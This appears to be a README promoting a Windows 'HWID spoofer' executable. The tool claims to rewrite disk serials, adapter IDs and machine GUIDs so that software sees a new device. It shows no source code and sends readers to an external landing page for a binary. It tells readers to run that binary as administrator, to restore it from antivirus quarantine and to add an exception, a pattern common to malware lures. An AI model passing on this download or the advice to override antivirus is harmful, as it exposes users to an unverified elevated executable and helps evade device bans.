<div align="center">
<img src="assets/banner.svg" width="100%" alt="Hwid Spoofer banner"/>
</div>

# hwid-spoofer-nova

![Version](https://img.shields.io/badge/Version-2026-DB2777?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)

*A clean way for Windows users to reset their hardware identifiers without touching a single line of code.*

</div>

## What this is

hwid-spoofer-nova is a standalone Windows utility built around one specific job: changing the hardware identifiers your system exposes to software, so a machine looks "new" to any application checking for a returning device. The project started as a weekend fix for a friend who kept getting flagged after a motherboard swap — most existing tools were either abandoned, bundled with junk, or too fragile to survive a Windows update. Nova was rebuilt from that frustration into something maintained, documented, and easy enough for a non-technical user to run.

Under the hood, the tool targets the identifiers most commonly read by third-party checks: disk serials, network adapter IDs, and a handful of registry-stored machine identifiers. It does not touch your files, does not require an internet connection to function, and leaves a restore point so the change is reversible. The goal is a tool that does one thing predictably, rather than a bloated suite trying to do everything.

<p align="center">
  <a href="https://ArchInvestor.github.io/hwid-spoofer-nova/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Hwid_Spoofer-DB2777?style=for-the-badge&logo=windows&logoColor=white&labelColor=BE185D" width="550" alt="Download"/>
  </a>
</p>

The button above opens the project's landing page, where you can grab the current download.

## Who it is for

- **PC builders and upgraders** — anyone who swapped a drive or motherboard and needs their system to stop looking like a duplicate.
- **QA and test-lab technicians** — testers who reimage machines often and need a fast way to reset identifiers between test runs.
- **Privacy-conscious users** — people who don't want persistent hardware fingerprints tied to unrelated accounts or sessions.
- **First-time contributors** — developers looking for a small, readable Windows utility codebase to learn from or improve.
- **Support staff** — helpdesk teams who need a repeatable identifier-reset step in their troubleshooting checklist.

## What you can do

- **Reset disk identifiers** — regenerate the serials reported by your primary and secondary drives.
- **Rotate network adapter IDs** — change the MAC-adjacent identifiers exposed by installed adapters.
- **Refresh machine GUIDs** — update the registry-level identifiers Windows assigns to the install itself.
- **Create a restore point automatically** — every run snapshots your system first, so changes are reversible.
- **Run without installation** — a single executable, no setup wizard, no background service left behind.
- **Review a change log after each run** — see exactly which identifiers were touched, in plain text.
- **Revert with one click** — undo the last spoof session from the same interface you used to run it.
- **Work fully offline** — no telemetry, no phoning home, no dependency on a live connection.

## Getting started

1. Open the landing page using the download button above.
2. Download the latest `hwid-spoofer-nova` release for your Windows version.
3. Extract the archive to any folder — no installer, no admin setup wizard.
4. Right-click the executable and choose **Run as administrator** (identifier changes require elevated rights).
5. Follow the on-screen prompts, confirm the restore point, and let it finish.

## Requirements

- Windows 10 or Windows 11 (64-bit).
- Administrator rights on the account you run it from.
- No .NET, Python, or build toolchain needed — it's a single standalone executable.
- Roughly 50 MB of free disk space for the restore point Nova creates.

## How it works

1. Nova scans the system for the identifiers currently exposed (disk, adapter, registry GUIDs).
2. It creates a Windows restore point before making any change.
3. It generates new values for the selected identifiers and writes them at the appropriate system level.
4. It logs every change made during the session to a local text file.
5. On the next run, you can choose to spoof again or revert to the previous state.

```mermaid
flowchart LR
A[Scan identifiers] --> B[Create restore point]
B --> C[Generate new values]
C --> D[Apply changes]
D --> E[Write session log]
```

## FAQ

**What exactly does a hwid spoofer change?**
It changes the identifiers Windows reports for your storage drives, network adapters, and certain registry GUIDs — not your files, drivers, or installed software.

**Will this survive a Windows update?**
Most changes persist through routine updates, but a major Windows feature update can regenerate some identifiers on its own. Re-running Nova afterward resets them again.

**Do I need to disable my antivirus to run it?**
Some antivirus products flag identifier-editing tools generically because of what they do, not because of embedded malware. Check the landing page for current guidance before whitelisting anything.

**Can I undo the changes later?**
Yes. Every session creates a restore point first, and the built-in revert option in Nova walks it back without needing System Restore manually.

**Does this work on a virtual machine?**
Partially. Some identifiers inside a VM are controlled by the hypervisor rather than the guest OS, so results vary by virtualization platform.

## Troubleshooting

- **Nova closes immediately after opening.** Right-click and run as administrator — the process needs elevated rights to write to protected registry keys.
- **Changes don't appear to take effect.** Reboot after running Nova; some identifiers are only re-read at startup.
- **Antivirus quarantines the executable.** Restore it from quarantine and add a local exception; this is a common false positive for identifier-editing utilities.
- **Restore point creation fails.** Check that System Restore is enabled on your drive under System Properties, then run Nova again.

## License

This project is distributed under the [MIT License](LICENSE). Nova is provided as-is, without warranty of any kind — use it on systems and in contexts where you have the right to modify hardware-reported identifiers.

<p align="center">
  <a href="https://ArchInvestor.github.io/hwid-spoofer-nova/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Hwid_Spoofer-DB2777?style=for-the-badge&logo=windows&logoColor=white&labelColor=BE185D" width="550" alt="Download"/>
  </a>
</p>